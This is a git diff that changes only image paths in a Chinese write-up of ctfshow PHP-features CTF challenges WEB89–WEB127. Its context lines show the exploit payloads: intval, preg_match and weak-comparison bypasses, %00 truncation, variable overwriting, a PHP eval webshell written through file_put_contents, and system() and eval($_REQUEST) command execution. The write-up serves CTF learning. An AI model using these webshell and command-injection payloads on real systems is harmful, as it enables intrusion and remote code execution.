@@ -2,7 +2,7 @@
 
 ## WEB89 考点：intval函数
 
-![web89](ctfshow-php特性-wp/img/web89.png)
+![web89](img/web89.png)
 
 intval函数当传入的变量也是数组的时候，会返回1
 
@@ -10,7 +10,7 @@ payload:?num[]=1
 
 ## WEB90 考点：intval函数
 
-![WEB90](ctfshow-php特性-wp/img/web90.png)
+![WEB90](img/web90.png)
 
 方法1：
 
@@ -26,7 +26,7 @@ payload：num=4467A
 
 ## WEB91  考点 preg_match 
 
-![WEB91](ctfshow-php特性-wp/img/WEB91.png)
+![WEB91](img/WEB91.png)
 
 考点 preg_match 中/i 表示不区分大小写 /m 表示匹配换行
 
@@ -56,7 +56,7 @@ payload：cmd=php%0a123
 
 ## WEB94 考点：intval
 
-![WEB94](ctfshow-php特性-wp/img/WEB94.png)
+![WEB94](img/WEB94.png)
 
 开头不能为0且a-z都被限制，但是第一个比较是字符串比较而intval是取整数比较所以通过构造小数绕过
 
@@ -66,7 +66,7 @@ payload：?num=4476.0
 
 
 
-![WEB95](ctfshow-php特性-wp/img/WEB95.png)
+![WEB95](img/WEB95.png)
 
 额小数点也被正则了
 
@@ -82,7 +82,7 @@ payload：?num=+010574
 
 ## WEB96 考点：highlight_file
 
-![WEB96](ctfshow-php特性-wp/img/WEB96.png)
+![WEB96](img/WEB96.png)
 
 `highlight_file`里面表示的是文件路径,可以用`./`表示当前目录,或者用绝对路径
 
@@ -98,7 +98,7 @@ payload：a[]=1&b[]=2
 
 ## WEB98 审计
 
-![WEB98](ctfshow-php特性-wp/img/WEB98.png)
+![WEB98](img/WEB98.png)
 
 第一个判断是一个三元表达式，如果get为true则get和post指向同一个地址否则返回flag
 
@@ -112,7 +112,7 @@ payload：？1=1   post：HTTP_FLAG=flag
 
 ## WEB99  file_put_contents
 
-![99](ctfshow-php特性-wp/img/99.png)
+![99](img/99.png)
 
 审计。。file_put_contents原来把第二个参数的值写道第一个参数中可以原来创建一个新的文件写入一句话。
 
@@ -128,7 +128,7 @@ post:	content=<?php eval($_POST['a'];)>
 
 ## WEB100 审计
 
-![100](ctfshow-php特性-wp/img/100.png)
+![100](img/100.png)
 
 源码分析：
 
@@ -144,7 +144,7 @@ payload：?v1=1&v2=system("ls")&v3=;
 
 ## WEB101 反射api
 
-![101](ctfshow-php特性-wp/img/101.png)
+![101](img/101.png)
 
 消除了100的非预期。。
 
@@ -157,7 +157,7 @@ payload：?v1=1&v2=echo new Reflectionclass&v3=;
 
 ## WEB102 审计
 
-![102](ctfshow-php特性-wp/img/102.png)
+![102](img/102.png)
 
 v4为1 只要v2全为数字
 
@@ -183,7 +183,7 @@ v1=hex2bin
 
 ## WEB104 sha1绕过
 
-![104](ctfshow-php特性-wp/img/104.png)
+![104](img/104.png)
 
 弱比较，数组绕过
 
@@ -191,7 +191,7 @@ payload:?v2[]=1,v1[]=1
 
 ## WEB105 考点变量覆盖
 
-![105](ctfshow-php特性-wp/img/105.png)
+![105](img/105.png)
 
 考点变量覆盖
 
@@ -206,7 +206,7 @@ payload：（get）?suces=flag  （post）error=suces
 
 ## WEB107  弱比较
 
-![107](ctfshow-php特性-wp/img/107.png)
+![107](img/107.png)
 
 parse_str — 将字符串解析成多个变量
 
@@ -218,7 +218,7 @@ payload：（get）?v3[]=0 （post）v1="flag=0"
 
 ## WEB108 考点ereg的%00截断
 
-![108](ctfshow-php特性-wp/img/108.png)
+![108](img/108.png)
 
 考点ereg的%00截断
 
@@ -228,7 +228,7 @@ payload：?c=a%00778
 
 ## WEB109 考点类利用
 
-![109](ctfshow-php特性-wp/img/109.png)
+![109](img/109.png)
 
 考点类利用
 
@@ -238,7 +238,7 @@ payload：/?v1=exception&v2=system('tac fl36dg.txt')
 
 ## WEB110  php内置类 利用
 
-![110](ctfshow-php特性-wp/img/110.png)
+![110](img/110.png)
 
 考察：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpff.com/filesystemiterator https://www.php.net/manual/zh/class.filesystemiterator.php getcwd()函数 获取当前工作目录 返回当前工作目录
 
@@ -247,7 +247,7 @@ payload：/?v1=exception&v2=system('tac fl36dg.txt')
 
 ## WEB111  变量覆盖
 
-<img src="ctfshow-php特性-wp/img/111.png" alt="111" style="zoom:67%;" />
+<img src="img/111.png" alt="111" style="zoom:67%;" />
 
 php中$GLOBALS的用法是引用是全局作用域中的可用的全部变量，例如【$GLOBALS["foo"]】。$GLOBALS是一个包含了全部变量的全局组合数组。
 
@@ -259,7 +259,7 @@ payload：?v1=ctfshow&v2=GLOBALS
 
 ## WEB112  php伪协议
 
-![112](ctfshow-php特性-wp/img/112.png)
+![112](img/112.png)
 
 思路file不能是一个文件且要执行highlight_file,考虑伪协议
 
@@ -286,7 +286,7 @@ payload：payload: file=compress.zlib://flag.php
 
 ## WEB115 审计trim
 
-![115](ctfshow-php特性-wp/img/115.png)
+![115](img/115.png)
 
 要求num不能为36且在filter出来后为36
 
@@ -296,7 +296,7 @@ payload：?num=%0c36
 
 ## WEB123 字符串解析特性
 
-![123](ctfshow-php特性-wp/img/123.png)
+![123](img/123.png)
 
 要求传入一个CTF_SHOW和一个CTF_SHOW.COM但是php通过get和post穿传时变量名中的(.,+,空格)会变成_
 
@@ -318,7 +318,7 @@ POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[mumuzi])
 
 ## WEB126
 
-![126](ctfshow-php特性-wp/img/126.png)
+![126](img/126.png)
 
 非预期：通过$_REQUEST的参数逃逸
 
@@ -329,7 +329,7 @@ post: CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($_REQUEST[0])
 
 ## WEB127 变量覆盖
 
-![127](ctfshow-php特性-wp/img/127.png)
+![127](img/127.png)
 
 要求ctf_show=ilove36d
 
